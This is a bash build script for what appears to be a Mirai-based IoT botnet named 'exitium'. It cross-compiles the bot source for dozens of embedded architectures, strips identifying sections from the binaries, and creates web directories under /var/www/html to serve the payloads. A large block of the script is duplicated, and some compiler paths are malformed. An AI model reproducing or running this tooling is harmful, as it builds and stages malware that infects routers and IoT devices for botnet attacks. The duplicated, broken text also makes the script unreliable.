#!/bin/bash
export PATH=$PATH:/etc/xcompile/i586/bin
export PATH=$PATH:/etc/xcompile/m68k/bin
export PATH=$PATH:/etc/xcompile/mips/bin
export PATH=$PATH:/etc/xcompile/mipsel/bin
export PATH=$PATH:/etc/xcompile/powerpc/bin
export PATH=$PATH:/etc/xcompile/sh4/bin
export PATH=$PATH:/etc/xcompile/sparc/bin
export PATH=$PATH:/etc/xcompile/armv4l/bin
export PATH=$PATH:/etc/xcompile/armv5l/bin
export PATH=$PATH:/etc/xcompile/armv6l/bin
export PATH=$PATH:/etc/xcompile/armv7l/bin
export PATH=$PATH:/etc/xcompile/aarch64be/bin
export PATH=$PATH:/etc/xcompile/aarch64/bin
export PATH=$PATH:/etc/xcompile/arcle-750d/bin
export PATH=$PATH:/etc/xcompile/arcle-hs38/bin
export PATH=$PATH:/etc/xcompile/armebv7-eabihf/bin
export PATH=$PATH:/etc/xcompile/armv5-eabi/bin
export PATH=$PATH:/etc/xcompile/armv6-eabihf/bin
export PATH=$PATH:/etc/xcompile/armv7-eabihf/bin
export PATH=$PATH:/etc/xcompile/armv7m/bin
export PATH=$PATH:/etc/xcompile/bfin/bin
export PATH=$PATH:/etc/xcompile/m68k-68xxx/bin
export PATH=$PATH:/etc/xcompile/m68k-coldfire/bin
export PATH=$PATH:/etc/xcompile/microblazebe/bin
export PATH=$PATH:/etc/xcompile/microblazeel/bin
export PATH=$PATH:/etc/xcompile/mips32el/bin
export PATH=$PATH:/etc/xcompile/mips32r5el/bin
export PATH=$PATH:/etc/xcompile/mips32r6el/bin
export PATH=$PATH:/etc/xcompile/mips32/bin
export PATH=$PATH:/etc/xcompile/mips32r6el/bin
export PATH=$PATH:/etc/xcompile/mips64el-n32/bin
export PATH=$PATH:/etc/xcompile/mips64-n32/bin
export PATH=$PATH:/etc/xcompile/mips64r6el-n32/bin
export PATH=$PATH:/etc/xcompile/nios2/bin
export PATH=$PATH:/etc/xcompile/openrisc/bin
export PATH=$PATH:/etc/xcompile/powerpc64-e5500/bin
export PATH=$PATH:/etc/xcompile/powerpc64le-power8-/bin
export PATH=$PATH:/etc/xcompile/powerpc-e500mc/bin
export PATH=$PATH:/etc/xcompile/riscv64/bin
export PATH=$PATH:/etc/xcompile/sh-sh4aeb/bin
export PATH=$PATH:/etc/xcompile/sh-sh4/bin
export PATH=$PATH:/etc/xcompile/sparc64/bin
export PATH=$PATH:/etc/xcompile/sparcv8/bin
export PATH=$PATH:/etc/xcompile/x86-64-core-i7/bin
export PATH=$PATH:/etc/xcompile/x86-core2/bin
export PATH=$PATH:/etc/xcompile/x86-i686/bin
export PATH=$PATH:/etc/xcompile/xtensa-lx60/bin
rm -rf /var/www/html/exitium
mkdir /var/www/html/exitium/
mkdir /var/www/html/exitium/scrios
mkdir /var/www/html/exitium/scrios/exitium
makedir="/var/www/html/exitium/scrios/exitium"

function compile_bot {
    "$1-gcc" $3 bot/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
    "$1-strip" release/"$2" -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
}
function arm7_compile {
    "$1-gcc" $3 bot/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
}
function otherbin_compile {
    "$1-linux-gcc" -DMIRAI_BOT_ARCH="$3" bot/*.c -s -o release/"$2"
    "$1-linux-strip" release/"$2" -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr

}


rm -rf release
mkdir release
mkdir /var/www
mkdir /var/www/html
mkdir /var/www/html/exitium
mkdir $makedir
mkdir $makedir/0
mkdir $makedir/0/1
mkdir $makedir/0/2
mkdir $makedir/0/3
mkdir $makedir/0/4
mkdir $makedir/0/5
mkdir $makedir/0/6
mkdir $makedir/0/7
mkdir $makedir/0/8
mkdir $makedir/0/9
mkdir $makedir/0/10
mkdir $makedir/0/11
mkdir $makedir/0/12


echo "" >> /var/www/html/index.php
echo "" >> /var/www/html/exitium/index.php
echo "" >> /var/www/html/exitium/scrios/exitium/index.php
echo "" >> /var/www/html/exitium/scrios/exitium/index.php
echo "" >> /var/www/html/exitium/scrios/exitium/0/index.php
echo "" >> /var/www/html/exitium/scrios/exitium/0/1/index.php
echo "" >> /var/www/html/exitium/scrios/exitium/0/2//index.php
echo "" >> /var/www/html/exitium/scrios/exitium/0/3/index.php
echo "" >> /var/www/html/exitium/scrios/exitium/0/4/index.php
echo "" >> /var/www/html/exitium/scrios/exitium/0/5/index.php
echo "" >> /var/www/html/exitium/scrios/exitium/0/6/index.php
echo "" >> /var/www/html/exitium/scrios/exitium/0/7/index.php
echo "" >> /var/www/html/exitium/scrios/exitium/0/8/index.php
echo "" >> /var/www/html/exitium/scrios/exitium/0/9/index.php
echo "" >> /var/www/html/exitium/scrios/exitium/0/10/index.php
echo "" >> /var/www/html/exitium/scrios/exitium/0/11/index.php
echo "" >> /var/www/html/exitium/scrios/exitium/0/12/index.php

#!/bin/bash
export PATH=$PATH:/etc/xcompile/i586/bin
export PATH=$PATH:/etc/xcompile/m68k/bin
export PATH=$PATH:/etc/xcompile/mips/bin
export PATH=$PATH:/etc/xcompile/mipsel/bin
export PATH=$PATH:/etc/xcompile/powerpc/bin
export PATH=$PATH:/etc/xcompile/sh4/bin
export PATH=$PATH:/etc/xcompile/sparc/bin
export PATH=$PATH:/etc/xcompile/armv4l/bin
export PATH=$PATH:/etc/xcompile/armv5l/bin
export PATH=$PATH:/etc/xcompile/armv6l/bin
export PATH=$PATH:/etc/xcompile/armv7l/bin
export PATH=$PATH:/etc/xcompile/aarch64be/bin
export PATH=$PATH:/etc/xcompile/aarch64/bin
export PATH=$PATH:/etc/xcompile/arcle-750d/bin
export PATH=$PATH:/etc/xcompile/arcle-hs38/bin
export PATH=$PATH:/etc/xcompile/armebv7-eabihf/bin
export PATH=$PATH:/etc/xcompile/armv5-eabi/bin
export PATH=$PATH:/etc/xcompile/armv6-eabihf/bin
export PATH=$PATH:/etc/xcompile/armv7-eabihf/bin
export PATH=$PATH:/etc/xcompile/armv7m/bin
export PATH=$PATH:/etc/xcompile/bfin/bin
export PATH=$PATH:/etc/xcompile/m68k-68xxx/bin
export PATH=$PATH:/etc/xcompile/m68k-coldfire/bin
export PATH=$PATH:/etc/xcompile/microblazebe/bin
export PATH=$PATH:/etc/xcompile/microblazeel/bin
export PATH=$PATH:/etc/xcompile/mips32el/bin
export PATH=$PATH:/etc/xcompile/mips32r5el/bin
export PATH=$PATH:/etc/xcompile/mips32r6el/bin
export PATH=$PATH:/etc/xcompile/mips32/bin
export PATH=$PATH:/etc/xcompile/mips32r6el/bin
export PATH=$PATH:/etc/xcompile/mips64el-n32/bin
export PATH=$PATH:/etc/xcompile/mips64-n32/bin
export PATH=$PATH:/etc/xcompile/mips64r6el-n32/bin
export PATH=$PATH:/etc/xcompile/nios2/bin
export PATH=$PATH:/etc/xcompile/openrisc/bin
export PATH=$PATH:/etc/xcompile/powerpc64-e5500/bin
export PATH=$PATH:/etc/xcompile/powerpc64le-power8-/bin
export PATH=$PATH:/etc/xcompile/powerpc-e500mc/bin
export PATH=$PATH:/etc/xcompile/riscv64/bin
export PATH=$PATH:/etc/xcompile/sh-sh4aeb/bin
export PATH=$PATH:/etc/xcompile/sh-sh4/bin
export PATH=$PATH:/etc/xcompile/sparc64/bin
export PATH=$PATH:/etc/xcompile/sparcv8/bin
export PATH=$PATH:/etc/xcompile/x86-64-core-i7/bin
export PATH=$PATH:/etc/xcompile/x86-core2/bin
export PATH=$PATH:/etc/xcompile/x86-i686/bin
export PATH=$PATH:/etc/xcompile/xtensa-lx60/bin
rm -rf /var/www/html/exitium
mkdir /var/www/html/exitium/
mkdir /var/www/html/exitium/scrios
mkdir /var/www/html/exitium/scrios/exitium
makedir="/var/www/html/exitium/scrios/exitium"

function compile_bot {
    "$1-gcc" $3 bot/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
    "$1-strip" release/"$2" -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
}
function arm7_compile {
    "$1-gcc" $3 bot/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
}
function otherbin_compile {
    "$1-linux-gcc" -DMIRAI_BOT_ARCH="$3" bot/*.c -s -o release/"$2"
    "$1-strip" release/"$2" -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr

}


rm -rf release
mkdir release
mkdir /var/www
mkdir /var/www/html
mkdir /var/www/html/exitium
mkdir $makedir
mkdir $makedir/0
mkdir $makedir/0/1
mkdir $makedir/0/2
mkdir $makedir/0/3
mkdir $makedir/0/4
mkdir $makedir/0/5
mkdir $makedir/0/6
mkdir $makedir/0/7
mkdir $makedir/0/8
mkdir $makedir/0/9
mkdir $makedir/0/10
mkdir $makedir/0/11
mkdir $makedir/0/12


echo "" >> /var/www/html/index.php
echo "" >> /var/www/html/exitium/index.php
echo "" >> /var/www/html/exitium/scrios/exitium/index.php
echo "" >> /var/www/html/exitium/scrios/exitium/index.php
echo "" >> /var/www/html/exitium/scrios/exitium/0/index.php
echo "" >> /var/www/html/exitium/scrios/exitium/0/1/index.php
echo "" >> /var/www/html/exitium/scrios/exitium/0/2//index.php
echo "" >> /var/www/html/exitium/scrios/exitium/0/3/index.php
echo "" >> /var/www/html/exitium/scrios/exitium/0/4/index.php
echo "" >> /var/www/html/exitium/scrios/exitium/0/5/index.php
echo "" >> /var/www/html/exitium/scrios/exitium/0/6/index.php
echo "" >> /var/www/html/exitium/scrios/exitium/0/7/index.php
echo "" >> /var/www/html/exitium/scrios/exitium/0/8/index.php
echo "" >> /var/www/html/exitium/scrios/exitium/0/9/index.php
echo "" >> /var/www/html/exitium/scrios/exitium/0/10/index.php
echo "" >> /var/www/html/exitium/scrios/exitium/0/11/index.php
echo "" >> /var/www/html/exitium/scrios/exitium/0/12/index.php

/etc/xcompile/aarch64/bin/aarch64-linux-gcc bot/*.c -o release/wellidk.aarch64 -Daarch64 -w
/etc/xcompile/aarch64be/bin/aarch64_be-linux-gcc bot/*.c -o release/wellidk.aarch64be -Daarch64be -w
/etc/xcompile/arcle-750d/bin/arc-linux-gcc bot/*.c -o release/wellidk.arcle-750d -Darcle-750d -w
/etc/xcompile/arcle-hs38/bin/arc-linux-gcc bot/*.c -o release/wellidk.arcle-hs38 -Darcle-hs38 -w
/etc/xcompile/armebv7-eabihf/bin/armeb-linux-gcc bot/*.c -o release/wellidk.armebv7-eabihf -Darmebv7-eabihf -w
/etc/xcompile/armv4l/bin/armv4l-gcc bot/*.c -o release/wellidk.armv4l -Darmv4l -w
/etc/xcompile/armv5-eabi/bin/arm-linux-gcc bot/*.c -o release/wellidk.armv5-eabi -Darmv5-eabi -w
/etc/xcompile/armv5l/bin/armv5l-gcc bot/*.c -o release/wellidk.armv5l -Darmv5l -w
/etc/xcompile/armv6-eabihf/bin/arm-linux-gcc bot/*.c -o release/wellidk.armv6-eabihf -Darmv6-eabihf -w
/etc/xcompile/armv6l/bin/armv6l-gcc bot/*.c -o release/wellidk.armv6l -Darmv6l -w
/etc/xcompile/armv7-eabihf/bin/arm-linux-gcc bot/*.c -o release/wellidk.armv7-eabihf -Darmv7-eabihf -w
/etc/xcompile/armv7l/bin/armv7l-gcc bot/*.c -o release/wellidk.armv7l -Darmv7l -w
/etc/xcompile/armv7m/binarm-linux-gcc bot/*.c -o release/wellidk.armv7m -Darmv7m -w
/etc/xcompile/bfin/bin/bfin-linux-gcc bot/*.c -o release/wellidk.bfin -Dbfin -w
/etc/xcompile/i586/bin/i586-gcc bot/*.c -o release/wellidk.i586 -Di586 -w
/etc/xcompile/m68k/bin/m68k-gcc  bot/*.c -o release/wellidk.m68k -Dm68k -w
/etc/xcompile/m68k-68xxx/bin/m68k-linux-gcc bot/*.c -o release/wellidk.m68k-68xxx -Dm68k-68xxx -w
/etc/xcompile/m68k-coldfire/bin/m68k-linux-gcc bot/*.c -o release/wellidk.m68k-coldfire -Dm68k-coldfire -w
/etc/xcompile/microblazebe/bin/microblaze-linux-gcc bot/*.c -o release/wellidk.microblazebe -Dmicroblazebe -w
/etc/xcompile/microblazeel/bin/microblazeel-linux-gcc bot/*.c -o release/wellidk.microblazeel -Dmicroblazeel -w
/etc/xcompile/mips/bin/mips-gcc bot/*.c -o release/wellidk.mips -Dmips -w
/etc/xcompile/mips32/bin/mips-linux-gcc bot/*.c -o release/wellidk.mips32 -Dmips32 -w
/etc/xcompile/mipsel-linux-gcc bot/*.c -o release/wellidk.mips32el -Dmips32el -w
/etc/xcompile/mips32r5el/bin/mipsel-linux-gcc bot/*.c -o release/wellidk.mips32r5el -Dmips32r5el -w
#/etc/xcompile/mips32r6el/bin/mips32r6el-linux-gcc bot/*.c -o release/wellidk.mips32r6el -Dmips32r6el -w
/etc/xcompile/mips64el-n32/bin/mips64el-linux-gcc bot/*.c -o release/wellidk.mips64el-n32 -Dmips64el-n32 -w
/etc/xcompile/mips64-n32/bin/mips64-linux-gcc bot/*.c -o release/wellidk.mips64-n32 -Dmips64-n32 -w
/etc/xcompile/mips64r6el-n32/bin/mips64el-linux-gcc bot/*.c -o release/wellidk.mips64r6el-n32 -Dmips64r6el-n32 -w
/etc/xcompile/mipsel/bin/mipsel-gcc bot/*.c -o release/wellidk.mipsel -Dmipsel  -w
/etc/xcompile/nios2/bin/nios2-linux-gcc bot/*.c -o release/wellidk.nios2 -Dnios2 -w
/etc/xcompile/openrisc/bin/or1k-linux-gcc bot/*.c -o release/wellidk.openrisc -Dopenrisc -w
/etc/xcompile/powerpc/bin/powerpc-gcc bot/*.c -o release/wellidk.powerpc -Dpowerpc -w
/etc/xcompile/powerpc64-e5500/bin/powerpc64-linux-gcc bot/*.c -o release/wellidk.powerpc64-e5500 -Dpowerpc64-e5500 -w
/etc/xcompile/powerpc64le-power8/bin/powerpc64le-linux-gcc bot/*.c -o release/wellidk.powerpc64le-power8 -Dpowerpc64le-power8 -w
/etc/xcompile/powerpc-e500mc/bin/powerpc-linux-gcc bot/*.c -o release/wellidk.powerpc-e500mc -Dpowerpc-e500mc -w
/etc/xcompile/riscv64/bin/riscv64-linux-gcc bot/*.c -o release/wellidk.riscv64 -Driscv64 -w
/etc/xcompile/sh4/bin/sh4-linux-gcc bot/*.c -o release/wellidk.sh4 -Dsh4 -w
/etc/xcompile/sh-sh4/bin/sh4-linux-gcc bot/*.c -o release/wellidk.sh-sh4 -Dsh-sh4 -w
/etc/xcompile/sh-sh4aeb/bin/sh4aeb-linux-gcc bot/*.c -o release/wellidk.sh-sh4aeb -Dsh-sh4aeb -w
/etc/xcompile/sparc/bin/sparc-gcc bot/*.c -o release/wellidk.sparc -Dsparc -w
/etc/xcompile/sparc64/bin/sparc64-linux-gcc bot/*.c -o release/wellidk.sparc64 -Dsparc64 -w
/etc/xcompile/sparcv8/bin/sparc-linux-gcc bot/*.c -o release/wellidk.sparcv8 -Dsparcv8 -w
/etc/xcompile/x86-64-core-i7/bin/x86_64-linux-gcc bot/*.c -o release/wellidk.x86-64-core-i7 -Dx86-64-core-i7 -w
/etc/xcompile/x86-core2/bin/i686-linux-gcc bot/*.c -o release/wellidk.x86-core2 -Dx86-core2 -w
/etc/xcompile/x86-i686/bin/i686-linux-gcc bot/*.c -o release/wellidk.x86-i686 -Dx86-i686 -w
/etc/xcompile/xtensa-lx60/bin/xtensa-linux-gcc bot/*.c -o release/wellidk.xtensa-lx60 -Dxtensa-lx60 -w




